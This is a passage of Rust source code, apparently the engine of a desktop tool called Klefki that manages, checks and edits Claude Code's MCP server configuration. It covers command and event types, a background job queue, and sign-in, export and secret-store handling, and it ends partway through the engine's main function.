//! The engine: one background thread owns the state, a small worker pool runs live status checks, and the UI
//! only sees events. The UI never touches files, processes or the network.
use crate::api::{Scope, ServerId, ServerRow, Snapshot, Status};
use crate::cli::locate;
use crate::cli::parse;
use crate::cli::runner::{self, RunOutput, RunSpec};
use crate::config::ConfigPaths;
use crate::config::docstore::{Docstore, Plan, StoreError};
use crate::config::entry;
use crate::config::fsx;
use crate::config::inventory::{self, FileKey, FileKeys};
use crate::diagnose::hints::{HintKind, hints_for};
use crate::diagnose::report;
use crate::model::ServerName;
use crate::ops;
use crate::sanitize::{clip, sanitize};
use crate::secrets::{Secret, SecretStore};
use crate::swap;
use crate::watch::{self, Watch};
use std::collections::{HashMap, HashSet, VecDeque};
use std::ffi::{OsStr, OsString};
use std::io;
use std::ops::Range;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::{self, Receiver, Sender};
use std::sync::{Arc, Condvar, Mutex, MutexGuard, RwLock};
use std::time::Duration;

#[cfg(test)]
mod machine;
mod sign_in;

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Command {
    /// Reload the configuration and check, in the background, the servers with no status of their own: unknown, or
    /// only last known from Claude's cache. With `live_all` (the user asked: F5), check every checkable server, up
    /// to `max_checks` at once; background checks run one at a time, as each is a large Node process.
    Refresh { live_all: bool },
    /// The servers the user can see now. Background checks of these go first.
    Visible(Vec<crate::model::ConnectionId>),
    /// Check one server now. This is the only way a project (`.mcp.json`) server is checked, because checking
    /// it runs the repository's command.
    Check(ServerId),
    /// Check one server again with the client's own debug output and explain what went wrong. Like `Check`,
    /// this runs a project server's command, so it only happens on request.
    Diagnose(ServerId),
    /// Work out what the changes would do to the configuration, and show it. Writes nothing.
    Prepare(Vec<Change>),
    /// Write a plan shown by [`Event::PlanReady`]. A plan can be applied once.
    Apply(u64),
    /// The user declined a plan.
    Discard(u64),
    /// Send the server's definition, for viewing and editing (see [`Event::Entry`]).
    Inspect(ServerId),
    /// The definitions of these servers as one `{"mcpServers": {…}}` block, values that may be secrets replaced by
    /// `${VAR}` references (see [`Event::Exported`]). Writes nothing.
    Export(Vec<ServerId>),
    /// Ask the user, in the system's save dialog, where to save an export; `name` is the file name to start from
    /// (see [`Event::ExportFileChosen`]). `shown` is the dialog when the UI already opened it over its window
    /// ([`Core::choose_export_file`]); without it no dialog is opened, and a path is asked for instead.
    ChooseExportFile {
        name: String,
        shown: Option<crate::export_file::ShownDialog>,
    },
    /// Write an exported block to `path` (see [`Event::ExportSaved`]). An existing file is replaced only with
    /// `replace`; Claude Code's own files and `.mcp.json` files are never written.
    SaveExport {
        path: PathBuf,
        text: String,
        replace: bool,
    },
    /// Ask the user, in the system's open dialog, for a file to import, and read it (see [`Event::ImportFile`]).
    /// `shown` is the dialog when the UI already opened it over its window ([`Core::choose_import_file`]); without
    /// it no dialog is opened, and a path is asked for instead.
    ChooseImportFile {
        shown: Option<crate::export_file::ShownDialog>,
    },
    /// Read the file at `path` for an import: typed, or dropped on the window (see [`Event::ImportFile`]). Writes
    /// nothing.
    ReadImportFile(PathBuf),
    /// Whether a client secret is stored for this OAuth server (see [`Event::SecretStatus`]).
    SecretStatus(ServerId),
    /// Keep this client secret for the OAuth server, in the system's secret store.
    StoreSecret {
        id: ServerId,
        secret: crate::secrets::Secret,
    },
    /// Remove the server's client secret from the system's secret store.
    ForgetSecret(ServerId),
    /// Sign in to an HTTP or SSE server through Claude Code (`claude mcp login`). Signing in again (re-authorizing)
    /// is the same. One sign-in at a time; it reports through [`Event::SignIn`].
    SignIn(ServerId),
    /// The address the browser ended up on, for when it could not reach Claude Code's listener. It is checked
    /// against the sign-in before it is typed into Claude's prompt.
    SignInPaste { id: ServerId, address: String },
    /// Open the running sign-in's page in the browser again.
    OpenSignInPage(ServerId),
    /// Give the running sign-in its whole wait again.
    KeepWaitingForSignIn(ServerId),
    /// Stop the running sign-in.
    CancelSignIn(ServerId),
    /// Whether a sign-in could come back to this OAuth callback port now (see [`Event::CallbackPort`]).
    CheckCallbackPort(u16),
    /// What Klefki changed, and the backups it kept (see [`Event::Activity`]). Read only when asked: the Activity log
    /// page asks each time it is opened.
    Activity,
    /// Claude Desktop's servers (see [`Event::Desktop`]). Read only when asked: the Claude Desktop page asks each time
    /// it is opened. Klefki never writes Claude Desktop's configuration.
    Desktop,
    /// Which servers use secrets and where each lives, and the client secrets nothing uses (see [`Event::Secrets`]).
    /// Read only when asked: the Secrets page asks each time it is opened. No secret is read.
    Secrets,
    /// [`Command::Secrets`] again after the files changed: the definitions are read again, and the system's store is
    /// not asked again (asking can prompt to unlock it, and Claude Code saves often); its last listing is used.
    SecretsAfterFileChange,
    /// Delete a client secret from the system's store that no server uses ([`crate::api::UnusedSecret`]). Refused
    /// when a server, or a definition Klefki keeps to put back, uses it by now. Answers with
    /// [`Event::UnusedSecretForgotten`], then [`Event::Secrets`].
    ForgetUnusedSecret(crate::model::ConnectionId),
}

/// Where a sign-in is ([`Event::SignIn`]). Text is sanitised.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SignInStep {
    /// Claude Code is starting. The sign-in is stopped once `wait` has passed with nothing back from the browser,
    /// unless [`Command::KeepWaitingForSignIn`] asks for longer.
    Starting {
        wait: Duration,
    },
    /// The sign-in page is open in the browser (or could not be opened: `opened` is false), and Claude Code waits for
    /// the browser to come back. `host` is where the page is; `link` the page itself, checked (https, and back to
    /// Claude Code on this computer), for copying.
    Waiting {
        host: String,
        link: String,
        opened: bool,
    },
    /// A pasted address was typed in; Claude Code is checking it.
    Pasted,
    /// A pasted address was not used; says why. The sign-in goes on.
    PasteRefused(String),
    /// Claude Code signed in. The server is checked again next.
    SignedIn,
    /// The sign-in ended without signing in.
    Failed(SignInFailure),
    Cancelled,
}

/// Why a sign-in did not finish, in plain words.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SignInFailure {
    /// What happened, as a sentence.
    pub title: String,
    /// What to do about it, the most likely fix first.
    pub help: Vec<String>,
    /// Claude Code's own words, when they add something.
    pub said: Option<String>,
    /// Whether starting it again could work without changing anything first.
    pub can_retry: bool,
}

/// Something the user wants changed. Targets are rows of the current inventory; project scope cannot be
/// created, only toggled.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Change {
    /// Turn a server on or off (`/mcp disable`). For a user server this covers every project Claude knows.
    SetEnabled { id: ServerId, enabled: bool },
    /// Let Claude Code run a project (`.mcp.json`) server: the one thing written inside a repository. The plan
    /// shows everything the server would run first.
    Approve { id: ServerId },
    /// Delete a user or local server. Project servers live in the repository's `.mcp.json`, which klefki does not
    /// edit.
    Delete { id: ServerId },
    /// Replace the definition of a user or local server with `json`, as edited from [`Event::Entry`]: values shown
    /// as `<hidden>` keep the value they had. A server that signs in with OAuth (before or after) is removed and added
    /// again by Claude Code's own commands, and put back as it was if that fails (see `swap.rs`).
    Replace { id: ServerId, json: String },
    /// Give a user or local server another name, in the place it is in: the same definition, secrets included, and
    /// still off where it was off. For servers whose names differ only in case.
    Rename { id: ServerId, name: String },
    /// Copy a user or local server, definition and secrets included, to each of `targets` as `name`. One that signs
    /// in with OAuth is copied by Claude Code's own `claude mcp add-json`, with Klefki's copy of its client secret.
    Duplicate {
        id: ServerId,
        name: String,
        targets: Vec<crate::model::Target>,
    },
    /// Move a user or local server, under its own name, to `to`: another project, or from a project to the user or
    /// back. One that signs in with OAuth is removed and added again by Claude Code's own commands, and put back as it
    /// was if that fails (see `swap.rs`).
    Move {
        id: ServerId,
        to: crate::model::Target,
    },
    /// Add back a definition Klefki kept when a change could not put it back itself (a
    /// [`crate::api::Kept::id`]).
    PutBack { kept: String },
    /// Delete a definition Klefki kept (a [`crate::api::Kept::id`]): the user has it back another way.
    ForgetKept { kept: String },
    /// Move the old `mcpServersDisabled` list of `project` (a [`crate::api::LegacyDisabled::project`]) into the list
    /// Claude Code reads, so the servers on it are off again, and remove the old list.
    MigrateLegacyDisabled { project: String },
    /// Add a new server `name` with the definition `json` (from [`Pasted`](crate::api::Pasted), say) to each of
    /// `targets`. The plan shows everything it would run first. A definition that signs in with OAuth (an `oauth`
    /// object) is added by Claude Code's own `claude mcp add-json`, which keeps `secret`, the client secret, in its
    /// own secure storage; Klefki keeps a copy in the system's secret store. Only such a server takes a secret.
    Add {
        name: String,
        json: String,
        targets: Vec<crate::model::Target>,
        secret: Option<Secret>,
    },
    /// Put Claude Code's user and local servers, and which are switched off in each project, back the way the backup
    /// `backup` of `.claude.json` has them (an [`crate::api::Backup::path`] from the activity log). Servers added
    /// since are left as they are, and the rest of the file (Claude Code's own settings and history) too. Reviewed
    /// on its own, not with other changes.
    Restore { backup: String },
}

/// What a plan would change in one file. Lines starting with `+ ` are additions, `- ` removals, two spaces a
/// heading. Sanitised, and never carries server settings.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FileDiff {
    pub path: String,
    pub lines: Vec<String>,
}

/// What a change lets Claude Code run, shown in full before the user agrees. Sanitised; nothing is shortened.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Review {
    pub title: String,
    pub lines: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PlanView {
    pub id: u64,
    /// One plain sentence per change, for the top of the review.
    pub summary: Vec<String>,
    /// The confirm button's label ("Turn off", "Delete", "Approve", "Save", or "Apply" for a mix).
    pub action: String,
    /// The plan removes something: the confirm button is shown as dangerous.
    pub destructive: bool,
    pub files: Vec<FileDiff>,
    pub reviews: Vec<Review>,
    pub warnings: Vec<String>,
    /// Good to know, shown more quietly than warnings.
    pub notes: Vec<String>,
    /// The configuration already looks like this; applying would write nothing.
    pub nothing_to_do: bool,
}

/// One plain-language explanation of a common failure, in the parts a compiler error has.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Hint {
    pub title: String,
    /// The error code it was reported with, such as `ENOTFOUND`.
    pub code: Option<String>,
    /// What to do, one step per line, the most likely fix first.
    pub help: Vec<String>,
    /// The part of the server's command or URL the failure is about, and what to say under it.
    pub points_at: Option<(Focus, String)>,
}

/// A part of a server's command line or URL.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Focus {
    /// The host name of the URL.
    Host,
    /// Host and port.
    Address,
    /// The URL's path.
    Path,
    /// The program, without its arguments.
    Command,
}

impl Hint {
    /// Where in `target` (a row's command line or URL, as shown) the failure is, as a byte range. `said` is
    /// Claude's own message, which tells how much of a command line is the program when its path has spaces.
    pub fn span(&self, target: &str, said: Option<&str>) -> Option<Range<usize>> {
        let (focus, _) = self.points_at.as_ref()?;
        let Some(scheme_end) = target.find("://") else {
            if *focus != Focus::Command {
                return None;
            }
            let first = target.find(' ').unwrap_or(target.len());
            let mut ends = target
                .match_indices(' ')
                .map(|(i, _)| i)
                .chain([target.len()]);
            let named = said.and_then(|s| ends.rfind(|&e| s.contains(&target[..e])));
            let end = named.unwrap_or(first).max(first);
            return (end > 0).then_some(0..end);
        };
        let start = scheme_end + 3;
        let rest = &target[start..];
        let authority = rest.find(['/', '?', '#']).unwrap_or(rest.len());
        let host_at = rest[..authority].rfind('@').map_or(0, |i| i + 1);
        let host = &rest[host_at..authority];
        let host_len = if host.starts_with('[') {
            host.find(']').map_or(host.len(), |i| i + 1)
        } else {
            host.find(':').unwrap_or(host.len())
        };
        let range = match focus {
            Focus::Host => start + host_at..start + host_at + host_len,
            Focus::Address => start + host_at..start + authority,
            Focus::Path => {
                let path = &rest[authority..];
                start + authority..start + authority + path.find(['?', '#']).unwrap_or(path.len())
            }
            Focus::Command => return None,
        };
        (!range.is_empty()).then_some(range)
    }
}

/// What the client's debug output says about one server, made safe to show: sanitised, with secrets redacted.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Diagnosis {
    pub status: Status,
    pub detail: Option<String>,
    pub hints: Vec<Hint>,
    /// What the server process itself printed on stderr.
    pub server_said: Vec<String>,
    /// The client's log lines about this server.
    pub client_log: Vec<String>,
    /// Set when diagnosing itself ran into trouble (could not start, timed out, no debug output).
    pub note: Option<String>,
}

#[derive(Debug, Clone)]
pub enum Event {
    Snapshot(Arc<Snapshot>),
    CliVersion(Option<String>),
    /// The CLI could not be found or used; live checks are unavailable.
    CliProblem(String),
    /// Whether a client secret is stored for the server, after asking or after storing or forgetting one; `Err` says
    /// why the store could not answer or the change was refused. Never carries the secret.
    SecretStatus {
        id: ServerId,
        stored: Result<bool, String>,
    },
    Status {
        id: ServerId,
        status: Status,
        detail: Option<String>,
        /// What `detail` most likely means, in plain language. `None` when it matches no known failure.
        hint: Option<Hint>,
    },
    Diagnosis {
        id: ServerId,
        diagnosis: Diagnosis,
    },
    PlanReady(PlanView),
    /// The changes could not be turned into a plan (nothing was written).
    PlanFailed(String),
    /// The plan was written. `backup` is where the previous contents were saved.
    Applied {
        plan: u64,
        /// Anything was written. `false` when the files already looked like this.
        changed: bool,
        /// Where the previous contents were saved (several places are joined), when there were any.
        backup: Option<String>,
        /// Good to know about how it went (settings Claude Code left out, say). Sanitised.
        notes: Vec<String>,
    },
    /// A change is under way, slowly (Claude Code's own commands take seconds each): what it does now. Sanitised.
    Applying {
        plan: u64,
        step: String,
    },
    /// Nothing was written, or the change could not be kept.
    ApplyFailed {
        plan: u64,
        error: String,
    },
    /// Claude Code overwrote the change right after it was written, and it was put back.
    Reapplied {
        plan: u64,
    },
    /// A server's definition as pretty JSON, environment and header values replaced by `<hidden>`, or why it could
    /// not be read. `editable` is false for project servers (the repository's file).
    Entry {
        id: ServerId,
        json: Result<String, String>,
        editable: bool,
    },
    SignIn {
        id: ServerId,
        step: SignInStep,
    },
    /// The block [`Command::Export`] asked for.
    Exported(crate::export::Exported),
    /// Where the user chose to save an export, after [`Command::ChooseExportFile`].
    ExportFileChosen(crate::export_file::FileChoice),
    /// Whether [`Command::SaveExport`] wrote the file. `shown` is the path as it can be shown (sanitised).
    ExportSaved {
        path: PathBuf,
        shown: String,
        result: Result<(), crate::export_file::SaveError>,
    },
    /// The file to import, read, or why there is none ([`Command::ChooseImportFile`], [`Command::ReadImportFile`]).
    ImportFile(crate::import_file::ImportFile),
    /// Why a sign-in could not come back to `port` now, or `None` when it could ([`Command::CheckCallbackPort`]).
    CallbackPort {
        port: u16,
        warning: Option<String>,
    },
    /// The activity log, after [`Command::Activity`].
    Activity(crate::activity::Activity),
    /// Claude Desktop's servers, after [`Command::Desktop`].
    Desktop(crate::desktop::Desktop),
    /// What the Secrets page shows, after [`Command::Secrets`].
    Secrets(crate::secret_uses::Secrets),
    /// Whether [`Command::ForgetUnusedSecret`] deleted the secret, or why not (sanitised).
    UnusedSecretForgotten {
        connection: crate::model::ConnectionId,
        result: Result<(), String>,
    },
}

/// The UI's handle to the engine.
pub struct Core {
    tx: Sender<Command>,
    rx: Receiver<Event>,
    /// Opens the system's save dialog; `None` for a detached `Core` that opens none.
    open_dialog: Option<crate::export_file::OpenDialog>,
    /// Opens the system's open dialog; `None` for a detached `Core` that opens none.
    pick_dialog: Option<crate::import_file::PickDialog>,
}

impl Core {
    pub fn send(&self, command: Command) {
        let _ = self.tx.send(command);
    }

    /// [`Command::ChooseExportFile`] with the system's save dialog opened here, over `owner` (Klefki's window), so it
    /// belongs to that window: a click on the window cannot send it behind, and on macOS it is the window's sheet.
    /// Call it on the thread that owns the window. It returns once the dialog is open; the engine waits for the
    /// answer.
    pub fn choose_export_file(&self, name: String, owner: Option<&dyn crate::export_file::Owner>) {
        let shown = self
            .open_dialog
            .as_ref()
            .map(|open| crate::export_file::ShownDialog::open(open, &name, owner));
        self.send(Command::ChooseExportFile { name, shown });
    }

    /// [`Command::ChooseImportFile`] with the system's open dialog opened here, over `owner` (Klefki's window), as
    /// [`Core::choose_export_file`] does. Call it on the thread that owns the window.
    pub fn choose_import_file(&self, owner: Option<&dyn crate::export_file::Owner>) {
        let shown = self
            .pick_dialog
            .as_ref()
            .map(|pick| crate::export_file::ShownDialog::pick(pick, owner));
        self.send(Command::ChooseImportFile { shown });
    }

    /// The next event, if one is ready. Never blocks.
    pub fn try_recv(&self) -> Option<Event> {
        self.rx.try_recv().ok()
    }

    /// A `Core` that is not connected to an engine, for testing code that talks to one: the test plays the
    /// engine's part through [`Detached`].
    #[doc(hidden)]
    pub fn detached() -> (Core, Detached) {
        let (tx, commands) = mpsc::channel();
        let (events, rx) = mpsc::channel();
        let core = Core {
            tx,
            rx,
            open_dialog: None,
            pick_dialog: None,
        };
        (core, Detached { commands, events })
    }

    /// [`Core::detached`], with `open` showing the save dialog instead of the system: it is told the file name and
    /// whether the dialog has an owner window.
    #[doc(hidden)]
    pub fn detached_with_dialog(
        open: impl Fn(&str, bool) -> Option<PathBuf> + Send + Sync + 'static,
    ) -> (Core, Detached) {
        let (mut core, engine) = Core::detached();
        core.open_dialog = Some(Arc::new(move |name, owner| {
            Box::pin(std::future::ready(open(name, owner.is_some())))
        }));
        (core, engine)
    }

    /// [`Core::detached`], with `pick` showing the open dialog instead of the system: it is told whether the dialog
    /// has an owner window.
    #[doc(hidden)]
    pub fn detached_with_pick_dialog(
        pick: impl Fn(bool) -> Option<PathBuf> + Send + Sync + 'static,
    ) -> (Core, Detached) {
        let (mut core, engine) = Core::detached();
        core.pick_dialog = Some(Arc::new(move |owner| {
            Box::pin(std::future::ready(pick(owner.is_some())))
        }));
        (core, engine)
    }
}

/// The engine's side of a [`Core::detached`] pair.
#[doc(hidden)]
pub struct Detached {
    pub commands: Receiver<Command>,
    pub events: Sender<Event>,
}

/// Everything the engine needs. Passed in, so tests never depend on the real environment.
pub(crate) struct EngineConfig {
    /// Where Claude keeps its files; `None` when the home folder cannot be found.
    pub paths: Option<ConfigPaths>,
    /// A user-configured path to the Claude CLI.
    pub claude: Option<PathBuf>,
    pub home: Option<PathBuf>,
    /// Private folder for backups of `.claude.json` before it is changed. Without it nothing is written.
    pub backup_dir: Option<PathBuf>,
    /// How long after a write to look again for an unlocked overwrite by Claude Code.
    pub verify_delay: Duration,
    pub path_var: Option<OsString>,
    /// Extra environment for the CLI. Used by tests to point `fake-claude` at a scenario.
    pub cli_env: Vec<(String, OsString)>,
    pub max_checks: usize,
    pub check_timeout: Duration,
    /// Check, in the background, the servers with no status of their own (the app). Off for a command-line run,
    /// which checks only the servers it is asked about.
    pub background_checks: bool,
    /// How often to look for changes made to the configuration from outside; `None` turns watching off.
    pub watch_interval: Option<Duration>,
    /// How long changed files must hold still before they are read again.
    pub watch_settle: Duration,
    /// Where client secrets are kept: `None` for the system's own store, opened when first needed (so starting
    /// never waits on it); tests give an in-memory one.
    pub secrets: Option<Arc<dyn SecretStore>>,
    /// Opens a checked sign-in page in the browser. Tests record the link instead.
    pub open_url: OpenUrl,
    /// Opens the system's save dialog. Tests answer for the user instead.
    pub open_dialog: crate::export_file::OpenDialog,
    /// Opens the system's open dialog. Tests answer for the user instead.
    pub pick_dialog: crate::import_file::PickDialog,
    /// How long a sign-in may wait for the user before it is stopped.
    pub sign_in_timeout: Duration,
    /// Runs Claude Code's own commands that change servers (`mcp add-json`, `mcp remove`) instead of the CLI found
    /// on disk. Tests give a stand-in that changes the configuration as Claude Code would.
    pub changer: Option<Arc<dyn swap::Claude>>,
    /// Where Claude Desktop's configuration can be. Tests give folders of their own, or none.
    pub desktop: crate::desktop::DesktopRoots,
}

/// Opens an https link in the user's browser.
pub(crate) type OpenUrl = Arc<dyn Fn(&str) -> io::Result<()> + Send + Sync>;

const MAX_CHECK_OUTPUT: usize = 64 * 1024;
const MAX_DEBUG_FILE: u64 = 1024 * 1024;
const VERSION_TIMEOUT: Duration = Duration::from_secs(10);
const MAX_DETAIL_CHARS: usize = 200;

pub(crate) fn start_with(config: EngineConfig, wake: impl Fn() + Send + Sync + 'static) -> Core {
    let (tx, cmd_rx) = mpsc::channel::<Command>();
    let (ev_tx, rx) = mpsc::channel();
    let emitter = Emitter {
        tx: ev_tx,
        wake: Arc::new(wake),
    };
    // The engine listens to the UI and to the file watcher. The UI's commands are passed on, and when the UI goes
    // away the engine is told to stop (the watcher keeps a sender of its own, so the channel alone would not close).
    let (input_tx, input_rx) = mpsc::channel();
    let ui = input_tx.clone();
    std::thread::Builder::new()
        .name("klefki-commands".into())
        .stack_size(64 * 1024)
        .spawn(move || {
            for command in cmd_rx {
                if ui.send(Input::Ui(command)).is_err() {
                    return;
                }
            }
            let _ = ui.send(Input::Closed);
        })
        .expect("start the command relay");
    let open_dialog = Some(Arc::clone(&config.open_dialog));
    let pick_dialog = Some(Arc::clone(&config.pick_dialog));
    std::thread::spawn(move || engine_main(config, input_rx, input_tx, emitter));
    Core {
        tx,
        rx,
        open_dialog,
        pick_dialog,
    }
}

/// What the engine thread reacts to.
enum Input {
    Ui(Command),
    /// The watcher saw the configuration change on disk.
    FilesChanged,
    /// The UI is gone.
    Closed,
}

#[derive(Clone)]
struct Emitter {
    tx: Sender<Event>,
    wake: Arc<dyn Fn() + Send + Sync>,
}

impl Emitter {
    fn emit(&self, event: Event) {
        let _ = self.tx.send(event);
        (self.wake)();
    }

    fn status(&self, id: ServerId, status: Status, detail: Option<String>) {
        let hint = match status {
            Status::Failed | Status::Degraded | Status::NeedsAuth => detail
                .as_deref()
                .and_then(|d| Some(hint(*hints_for(d).first()?, d))),
            _ => None,
        };
        self.emit(Event::Status {
            id,
            status,
            detail,
            hint,
        });
    }
}

#[derive(Clone, Copy, PartialEq, Eq, Hash)]
enum JobKind {
    Check,
    Diagnose,
}

#[derive(Clone)]
struct Job {
    id: ServerId,
    /// Already validated; it is passed to the CLI as its own argument.
    name: ServerName,
    cwd: PathBuf,
    kind: JobKind,
    /// Tell the UI the check is running (only for rows that have nothing better to show meanwhile).
    announce: bool,
    /// Nobody asked for it: it runs only while no other background job does.
    background: bool,
    /// Asked for on its own ([`Queue::push_now`]): ahead of every other job, after earlier such asks.
    now: bool,
    /// A `claude mcp list` had no clear answer for it: it is checked on its own, not through another list.
    alone: bool,
}

#[derive(Default)]
struct Queue {
    jobs: VecDeque<Job>,
    /// Background jobs running now; at most [`BACKGROUND_CHECKS`].
    background_running: usize,
    /// The servers on screen, from [`Command::Visible`]: their background jobs go first.
    visible: std::collections::HashSet<crate::model::ConnectionId>,
    /// Checks that said they are running and have not answered yet: the app forgets "Checking…" on every
    /// snapshot, so each reload says it again for those that will still answer.
    announced: Vec<Running>,
    /// Tells the entries of [`Queue::announced`] apart.
    tokens: u64,
    shutdown: bool,
}

impl Queue {
    /// The next job a worker may take: the first that is not background, or the first background one when there is
    /// room for it.
    /// Queues checks, leaving out servers that already have one queued (a server switched off and on again).
    fn add(&mut self, jobs: Vec<Job>) {
        let mut queued: HashSet<_> = self
            .jobs
            .iter()
            .map(|q| (q.kind, q.id.connection.clone()))
            .collect();
        for job in jobs {
            if queued.insert((job.kind, job.id.connection.clone())) {
                self.jobs.push_back(job);
            }
        }
        self.order();
    }

    /// Puts a job the user asked for in front, behind those asked for the same way before it, so that they run in the
    /// order asked. A check of the same server still waiting is dropped: it would run the server again, and its later
    /// answer would replace this one.
    fn push_now(&mut self, job: Job) {
        let connection = &job.id.connection;
        self.jobs
            .retain(|q| !(q.kind == JobKind::Check && q.id.connection == *connection));
        let at = self.jobs.iter().take_while(|q| q.now).count();
        self.jobs.insert(at, Job { now: true, ..job });
    }

    /// Takes the other background checks waiting to run in `cwd`, to be answered by one `claude mcp list`. None when
    /// there are too few for a list to pay off: it starts every server of the folder, those not asked about too.
    fn take_mates(&mut self, cwd: &Path) -> Vec<Job> {
        let is_mate =
            |j: &Job| j.background && j.kind == JobKind::Check && !j.alone && j.cwd == cwd;
        if self.jobs.iter().filter(|j| is_mate(j)).count() + 1 < MIN_LIST_BATCH {
            return Vec::new();
        }
        let (mates, rest): (Vec<Job>, Vec<Job>) = std::mem::take(&mut self.jobs)
            .into_iter()
            .partition(|j| is_mate(j));
        self.jobs = rest.into();
        mates
    }

    fn take(&mut self) -> Option<Job> {
        let room = self.background_running < BACKGROUND_CHECKS;
        let at = self.jobs.iter().position(|j| room || !j.background)?;
        let job = self.jobs.remove(at)?;
        if job.background {
            self.background_running += 1;
        }
        Some(job)
    }

    /// Jobs the user asked for first, then background ones on screen; within each, those with nothing to show yet
    /// first, otherwise in the order they came.
    fn order(&mut self) {
        let visible = &self.visible;
        let rank = |j: &Job| {
            let waiting = u8::from(!j.announce);
            if j.background {
                2 + u8::from(!visible.contains(&j.id.connection)) * 2 + waiting
            } else {
                waiting
            }
        };
        self.jobs.make_contiguous().sort_by_key(rank);
    }
}

/// A running background job's place in [`Queue::background_running`], given back when dropped, also when the job
/// panics: a slot kept by a panic would stop every later background check.
struct BackgroundSlot<'a> {
    queue: &'a Mutex<Queue>,
    wake: &'a Condvar,
}

impl Drop for BackgroundSlot<'_> {
    fn drop(&mut self) {
        lock(self.queue).background_running -= 1;
        // A worker may be waiting for room to run the next one.
        self.wake.notify_all();
    }
}

struct Running {
    token: u64,
    connection: crate::model::ConnectionId,
    /// The change count its answer is compared with ([`Changes::since`]); `None` until it is taken.
    started: Option<u64>,
}

/// A running check's entry in [`Queue::announced`], taken out when dropped, also when the job panics.
struct Announced<'a> {
    queue: &'a Mutex<Queue>,
    token: u64,
}

impl<'a> Announced<'a> {
    fn new(queue: &'a Mutex<Queue>, connection: &crate::model::ConnectionId) -> Self {
        let mut q = lock(queue);
        q.tokens += 1;
        let token = q.tokens;
        q.announced.push(Running {
            token,
            connection: connection.clone(),
            started: None,
        });
        Self { queue, token }
    }

    fn started(&self, count: u64) {
        if let Some(r) = lock(self.queue)
            .announced
            .iter_mut()
            .find(|r| r.token == self.token)
        {
            r.started = Some(count);
        }
    }
}

impl Drop for Announced<'_> {
    fn drop(&mut self) {
        lock(self.queue).announced.retain(|r| r.token != self.token);
    }
}

/// Background checks running at once. Each is a `claude` process, a Node program of about 190 MB: three at once took
/// klefki from 123 MB to about 700 MB at startup. One keeps it near 300 MB.
const BACKGROUND_CHECKS: usize = 1;

/// Background checks of one folder that are answered by one `claude mcp list` instead of one `mcp get` each: the
/// list costs one Claude start and checks all servers at once (30 servers: 2.6 s against 28.5 s), but it starts
/// every server of the folder, so for a few separate checks are as quick and touch only those.
const MIN_LIST_BATCH: usize = 4;

/// A list holds a line for every server of the folder, with its command.
const MAX_LIST_OUTPUT: usize = 4 * 1024 * 1024;

/// What a list is run with, besides the usual environment.
/// - No claude.ai connectors: a list also checks those over the network (21 of them took 19-32 s where the servers in
///   the files took 7 s), and they are not servers of these files.
/// - A connection timeout of 3 s (Claude's own is 30 s) and 10 servers connected at once (Claude's is 3): a list
///   prints only when the last server is done, so one that hangs would hold back the answers of all the others for
///   30 s. Now that is about 8 s (the 3 s probe Claude starts with, the timeout and its own start); 6 hanging servers
///   took 13.5 s with 3 at once, 8.4 s with 10. A server that needs longer than 3 s is not given a failure for it:
///   see `parse::parse_list`, and it is checked with `get`.
const LIST_ENV: [(&str, &str); 3] = [
    ("ENABLE_CLAUDEAI_MCP_SERVERS", "false"),
    ("MCP_TIMEOUT", "3000"),
    ("MCP_SERVER_CONNECTION_BATCH_SIZE", "10"),
];

fn list_env<'a>(mut base: Vec<(&'a str, &'a OsStr)>) -> Vec<(&'a str, &'a OsStr)> {
    base.extend(LIST_ENV.iter().map(|&(k, v)| (k, OsStr::new(v))));
    base
}

struct Shared {
    config: EngineConfig,
    queue: Mutex<Queue>,
    wake_workers: Condvar,
    /// When each server's definition last changed: a check that started before that answers for a server that is
    /// gone.
    changes: Mutex<Changes>,
    claude: RwLock<Option<PathBuf>>,
    /// The CLI's version, for the program file it was read from. Asking costs a process start (Claude Code is a
    /// large Node program), so it is only asked again when the file changes.
    version: Mutex<Option<(ProgramStamp, Option<String>)>>,
    /// The secret store once opened. Not kept when opening failed, so a store unlocked later is found.
    secret_store: Mutex<Option<Arc<dyn SecretStore>>>,
    /// Cleared when a `claude mcp list` gave no answer at all (it failed, or its output is not what is read): every
    /// check is then a `get`, as before, until klefki is started again.
    list_works: AtomicBool,
    /// What the system's store last listed for the Secrets page, or why it could not.
    secrets_listed: Mutex<Option<Result<Vec<crate::model::ConnectionId>, String>>>,
    /// Per file, the redo log of klefki's changes whose check is still due.
    journals: Arc<Mutex<HashMap<PathBuf, Journal>>>,
    emitter: Emitter,
    /// For threads that need the engine thread to do something (read the files again).
    input: Sender<Input>,
}

/// Changes of server definitions, counted: [`Changes::at`] holds the count at each server's last change (an edit,
/// or its removal). Small: one number per server that ever changed while klefki ran.
#[derive(Default)]
struct Changes {
    count: u64,
    at: HashMap<crate::model::ConnectionId, u64>,
}

impl Changes {
    fn note(&mut self, connection: &crate::model::ConnectionId) {
        self.count += 1;
        self.at.insert(connection.clone(), self.count);
    }

    /// Whether the server changed after the count was `since`.
    fn since(&self, connection: &crate::model::ConnectionId, since: u64) -> bool {
        self.at.get(connection).is_some_and(|&at| at > since)
    }
}

/// Identifies one build of the CLI on disk: its path, size and modification time.
#[derive(Clone, PartialEq, Eq)]
struct ProgramStamp {
    path: PathBuf,
    len: u64,
    modified: Option<std::time::SystemTime>,
}

impl ProgramStamp {
    fn of(path: &Path) -> Option<Self> {
        let meta = std::fs::metadata(path).ok()?;
        Some(Self {
            path: path.to_owned(),
            len: meta.len(),
            modified: meta.modified().ok(),
        })
    }
}

fn engine_main(
    config: EngineConfig,
    inputs: Receiver<Input>,
    input_tx: Sender<Input>,
    emitter: Emitter,
) {
    let workers = config.max_checks.max(1);
    let shared = Arc::new(Shared {
        config,
        queue: Mutex::new(Queue::default()),
        wake_workers: Condvar::new(),
        changes: Mutex::default(),
        claude: RwLock::new(None),
        version: Mutex::new(None),
        journals: Arc::default(),
        secret_store: Mutex::new(None),
        list_works: AtomicBool::new(true),
        secrets_listed: Mutex::new(None),
        emitter,
        input: input_tx.clone(),
    });
    for _ in 0..workers {
